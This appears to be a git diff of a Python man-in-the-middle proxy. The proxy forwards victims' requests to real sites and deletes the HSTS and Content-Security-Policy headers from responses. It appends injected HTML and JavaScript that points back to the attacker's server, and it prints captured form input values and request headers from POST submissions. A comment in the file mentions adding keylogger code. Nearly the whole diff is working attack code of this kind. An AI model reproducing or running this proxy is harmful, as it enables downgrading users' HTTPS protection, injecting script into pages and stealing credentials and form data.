@@ -21,6 +21,17 @@ import json
 # Add keylogger code
 '''
 
+# Description: Modify the response headers
+def modify_headers(rsp):
+    # Parse the response and send to user
+    if "Strict-Transport-Security" in rsp.headers: del rsp.headers["Strict-Transport-Security"]
+    if "Content-Security-Policy" in rsp.headers: del rsp.headers["Content-Security-Policy"]
+    if "Transfer-Encoding" in rsp.headers: del rsp.headers["Transfer-Encoding"]
+    if "Content-Encoding" in rsp.headers: del rsp.headers["Content-Encoding"]
+
+    return rsp
+
+# Description: Modify the byte content
 def modify_b_content(b_content):
     server_url = f"http://{get_ip_address()}"
     new_html = '<div><button onclick="handleClick()">Click me</button></div>'
@@ -50,19 +61,12 @@ def modify_b_content(b_content):
             });
         </script>
         ''' % server_url
-    new_php = '''
-    <?php
 
-    ?>
-
-    '''
-    b_new_html = new_html.encode('utf-8')
-    b_new_script = new_script.encode('utf-8')
-    b_new_php = new_php.encode('utf-8')
+    b_new_html = new_html.encode()
+    b_new_script = new_script.encode()
 
     b_content += b_new_html
     b_content += b_new_script
-    b_content += b_new_php
 
     return b_content
 
@@ -83,161 +87,70 @@ class CORSRequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
 
 class ProxyHTTPRequestHandler(CORSRequestHandler):
+    session = requests.Session()
+
     def do_GET(self):
-        # Parse dst host and path
-        dst_host = self.headers.get('Host')
-        dst_path = urlparse(self.path).path
-
-        # Create a connection to the target server 
-        conn = http.client.HTTPSConnection(dst_host)
-
-        conn.request("GET", dst_path)   # Forward the request to the target server 
-        response = conn.getresponse()   # Get the response
-
-        if "Strict-Transport-Security" in response.headers: del response.headers["Strict-Transport-Security"]
-        if "Content-Security-Policy" in response.headers: del response.headers["Content-Security-Policy"]
-        if "Transfer-Encoding" in response.headers: del response.headers["Transfer-Encoding"]
-        
-        # Check for 301 redirect
-        if response.status == 301 or response.status == 308:
-            # Extract the new location from the response headers
-            new_location = response.getheader('Location')
-            
-            # Parse the new location to handle both absolute and relative URLs
-            parsed_url = urlparse(new_location)
-            
-            if not parsed_url.netloc:  # If it's a relative URL
-                new_location = f"https://{dst_host}{parsed_url.path}"
-
-            # Create a new connection to the new location
-            new_conn = http.client.HTTPSConnection(urlparse(new_location).netloc)
-            new_conn.request("GET", urlparse(new_location).path)
-            
-            # Get the new response
-            new_response = new_conn.getresponse()
-
-            if "Strict-Transport-Security" in new_response.headers: del new_response.headers["Strict-Transport-Security"]
-            if "Content-Security-Policy" in new_response.headers: del new_response.headers["Content-Security-Policy"]
-            if "Transfer-Encoding" in new_response.headers: del new_response.headers["Transfer-Encoding"]
-
-            b_content = new_response.read()
-            b_content = modify_b_content(b_content)
-
-            self.send_response(new_response.status)         # Send response status code
-            for key, value in response.getheaders():        # Send headers
-                self.send_header(key, value)
-                # print(key, value)
-
-            self.end_headers()                              # Send end headers (includes CORS headers)
-
-            # Write content to wfile in chunks
-            chunk_size = 8192
-            for i in range(0, len(b_content), chunk_size):
-                chunk = b_content[i:i + chunk_size]
-                self.wfile.write(chunk)
-
-            new_conn.close()
-        else:
-            b_content = response.read()
-            b_content = modify_b_content(b_content)
-
-            self.send_response(response.status)             # Send response status code
-            for key, value in response.getheaders():        # Send headers
-                self.send_header(key, value)
-                # print(key, value)
-            self.end_headers()                              # Send end headers (includes CORS headers)
-            
-            # Write content to wfile
-            chunk_size = 8192
-            for i in range(0, len(b_content), chunk_size):
-                chunk = b_content[i:i + chunk_size]
-                self.wfile.write(chunk)
-
-        conn.close()
-
-    def do_POST(self):
         try:
-            # # Get the contents of the POST request
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            post_data_obj = json.loads(post_data.decode())
-            
-            # Try to print out the key value pairs of filled input fields
-            try:
-                print("\n------------- Input Values Start -------------")
-                for key in post_data_obj:
-                    print(f"    {key}: {post_data_obj[key]}")
-                print("-------------- Input Values End --------------\n")
-            except:
-                pass
-            
-            print("\nHEADERS\n")
-            for key, value in self.headers.items():
-                print(key, value)
-            
-            print("\nDATA OBJ\n")
-            for key, value in post_data_obj.items():
-                print(key, value)
+            # Parse dst host and path
+            dst_host = self.headers.get('Host')
+            dst_path = urlparse(self.path).path
+
+            # Create a connection w/ the target host & path
+            rsp = self.session.request("GET", f"https://{dst_host}{dst_path}")
+            rsp = modify_headers(rsp)
+            rsp_content = modify_b_content(rsp.content)
+
+            # Send response status code, headers, end headers(CORS), and write response to client
+            self.send_response(rsp.status_code)
+            for key, value in rsp.headers.items():
+                self.send_header(key, value)
+            self.end_headers()
+            self.wfile.write(rsp_content)
 
         except Exception as ev:
             self.send_response(500)
             self.end_headers()
             self.wfile.write(b"Error: " + str(ev).encode())
 
-    # def do_POST(self):
-         
-    #     # Parse dst host and path
-    #     dst_host = self.headers.get('Host')
-    #     dst_path = urlparse(self.path).path
 
-    #     # Get the contents of the POST request
-    #     content_length = int(self.headers['Content-Length'])
-    #     post_data = self.rfile.read(content_length)
-        
-    #     # Connect to the target server
-    #     conn = http.client.HTTPSConnection(dst_host)
-
-    #     print("POST REQUEST")
-    #     print(post_data)
-    #     print(self.headers)
-
-    #     if "Origin" in self.headers:
-    #         self.headers["Origin"] = self.headers["Origin"].replace("http", "https")
-
-    #     if "Referer" in self.headers:
-    #         self.headers["Referer"] = self.headers["Referer"].replace("http", "https")
-
-    #     # will have to add some kind of cookie?? Interesting error from GitHub
+    def do_POST(self):
+        try:
+            # # Get the contents of the POST request
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
             
-    #     print("MODIFIED HEADERS")
-    #     print(self.headers)
-        
-    #     # Forward the request to the target server
-    #     conn.request("POST", dst_path, post_data)
+            # Try to print out the key value pairs of filled input fields
+            try:
+                post_data_obj = json.loads(post_data.decode())
 
-    #     # Get the response
-    #     response = conn.getresponse()
+                print("\n------------- Input Values Start -------------")
+                for key in post_data_obj:
+                    print(f"    {key}: {post_data_obj[key]}")
+                print("-------------- Input Values End --------------\n")
 
-    #     print("POST RESPONSE")
-    #     print(response)
-        
-    #     self.send_response(response.status)
-    #     b_content = response.read()
+            # Else (if not data_obj) then treat as a normal post request
+            except:
+                # Parse dst host and path
+                dst_host = self.headers.get('Host')
+                dst_path = urlparse(self.path).path
+                payload = post_data.decode()
 
-    #     # Send headers
-    #     # self.send_header('Content-type', 'text/html')
-    #     for header, value in response.headers.items():
-    #         self.send_header(header, value)
+                # Create a post to target host & path
+                rsp = self.session.post(f"https://{dst_host}{dst_path}", data=payload)
+                rsp = modify_headers(rsp)
+                rsp_content = modify_b_content(rsp.content)
 
-    #     self.end_headers()
-            
-    #     # Write content to wfile
-    #     chunk_size = 8192
-    #     for i in range(0, len(b_content), chunk_size):
-    #         chunk = b_content[i:i + chunk_size]
-    #         self.wfile.write(chunk)
+                # Send response status code, headers, end headers(CORS), and write response to client
+                self.send_response(rsp.status_code)
+                for key, value in rsp.headers.items():
+                    self.send_header(key, value)
+                self.end_headers()
+                self.wfile.write(rsp_content)
 
-    #     conn.close()
+        except Exception as ev:
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b"Error: " + str(ev).encode())
 
 class Server:
     def __init__(self, http_daemon = None, target_ip = None, is_ready_bool = False):
